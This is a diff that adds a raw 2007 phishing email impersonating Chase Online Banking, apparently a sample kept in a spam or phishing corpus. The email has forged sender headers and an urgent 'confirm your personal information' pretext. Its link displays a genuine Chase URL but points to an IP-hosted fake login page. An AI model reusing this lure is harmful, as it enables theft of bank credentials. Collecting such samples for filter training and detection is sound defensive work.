@@ -1,0 +1,53 @@
+Return-Path: <service@chase.com>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.4.9])
+	by example.com (Postfix) with ESMTP id C6A0D468F1
+	for <user@login.example.com>; Fri, 16 Mar 2007 14:12:06 -0400 (EDT)
+Received: from organiza-cplwf1 (24-107-213-151.dhcp.stls.mo.charter.com [24.107.213.151])
+	by mail.example.org (Postfix) with ESMTP id 1D18B131FC9F
+	for <user@example.com>; Fri, 16 Mar 2007 14:11:01 -0400 (EDT)
+Received: from User ([72.25.141.25]) by organiza-cplwf1 with Microsoft SMTPSVC(5.0.2195.6713);
+	 Fri, 16 Mar 2007 09:19:48 -0600
+Reply-To: <noreply@chase.com>
+From: "Chase Online Banking"<service@chase.com>
+Subject: Confirm Your Personal Information
+Date: Fri, 16 Mar 2007 08:16:43 -0600
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+Message-ID: <ORGANIZA-CPLWF1r2Ae00000aaa@organiza-cplwf1>
+X-OriginalArrivalTime: 16 Mar 2007 15:19:49.0005 (UTC) FILETIME=[89775BD0:01C767DE]
+To: undisclosed-recipients:;
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 977
+
+<html>
+<img src="http://www.chase.com/ccpmweb/shared/image/chaseNewlogo.gif">
+<style>
+.text2 {
+	FONT-SIZE: 80%; COLOR: #333333; FONT-FAMILY: Verdana
+}
+</style>
+<br><br>
+<SPAN class=text2>Dear JPMorgan Chase Customer,<br><br>
+<br>During our regularly scheduled account maintenance and verification procedures,
+<br>we have detected a slight error in your account information.
+<br>To securely confirm your personal information please click on the link bellow:
+<br>
+<br><a href="http://210.17.238.9/chase/sitekey/profile/login.htm">https://chaseonline.chase.com/colappmgr/colportal/prospect?_nfpb=true&_pageLabel=page_logonform</a>
+<br><br>Confirm Your JPMorgan Chase Account and SiteKey now to enjoy the benefits of
+<br>online banking and finance to avoid identity theft and fraudulent activities on
+<br>your account.
+<br><br><b>Note: We will be upgrading our yearly SSL EncryptedServer to prevent fraudulent
+<br>activity.</b>
+<br><br>© 2007 JPMorgan Chase & Co. All rights reserved.
+</span></html>
+
